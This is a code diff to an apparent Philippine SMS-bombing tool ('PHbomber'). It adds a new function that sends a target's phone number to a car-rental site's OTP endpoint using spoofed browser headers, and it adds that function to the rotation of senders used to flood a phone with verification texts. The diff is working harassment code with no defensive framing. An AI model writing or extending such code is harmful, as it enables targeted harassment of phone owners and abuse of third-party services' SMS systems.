@@ -27,7 +27,7 @@ logo = (""" \033[1;92m____  _   _ _                     _
 | |_) | |_| | '_ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|
 |  __/|  _  | |_) | (_) | | | | | | |_) |  __/ |
 |_|   |_| |_|_.__/ \___/|_| |_| |_|_.__/ \___|_|
- by aknown version 1.6.1""")
+ by aknown version 1.6.2""")
 if sys.platform == "linux" or sys.platform == "linux2":
     clr = "clear"
 elif sys.platform == "win32" or sys.platform == "cygwin" or sys.platform == "msys":
@@ -793,6 +793,36 @@ def otp20(number):
         if debugError == True:
             print(f"\033[1;91mError otp19 {e}\033[1;92m")
         return False
+
+def otp21(number):
+    global LIMIT, ERROR
+    number = to9(number=number)
+    session = requests.Session()
+    url = "https://www.yoocars.vip/nauth/api/auth/send_sms"
+    header = {'Host': 'www.yoocars.vip', 'Connection': 'keep-alive', 'Content-Length': '49', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'DNT': '1', 'Language': 'en', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json;charset=UTF-8', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform': '"Windows"', 'Origin': 'https://www.yoocars.vip', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.yoocars.vip', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9,fil-PH;q=0.8,fil;q=0.7'}
+    body = {"mobile":str(number),"area_code":63, 'type':2}
+
+    try:
+        web = session.post(url, headers=header, json=body, timeout=8)
+        result = json.loads(web.text)
+        if debug == True:
+            print(f"{web.status_code} from fidality")
+        if result['code'] == 1:
+            LIMIT += 1
+            # try:
+            #     sleep = result['value']['expiredMinutes']*60
+            #     time_sleep(sleep)
+            # except:
+            #     pass
+            return True
+        else:
+            ERROR += 1
+            return False
+    except Exception as e:
+        ERROR += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp19 {e}\033[1;92m")
+        return False
 # you can add api and put it in the box to run
 
 # mainporcesore
@@ -840,7 +870,7 @@ def home():
                 otp5, otp6, otp7, otp8, otp9,
                 otp11, otp12, otp13, otp14,
                 otp15, otp16, otp17, otp18,
-                otp19, otp20
+                otp19, otp20, otp21
                 ]
     # append LIMIT in global variables
     LIMIT1 = pick()
